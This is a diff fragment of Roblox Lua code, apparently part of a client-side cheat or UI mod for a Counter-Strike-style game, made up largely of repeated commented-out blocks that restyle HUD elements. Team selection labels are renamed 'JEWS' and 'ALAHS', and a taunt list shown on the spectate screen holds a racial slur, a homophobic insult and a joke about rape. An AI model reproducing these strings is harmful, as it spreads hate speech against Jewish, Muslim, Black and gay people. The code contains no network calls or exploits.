+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
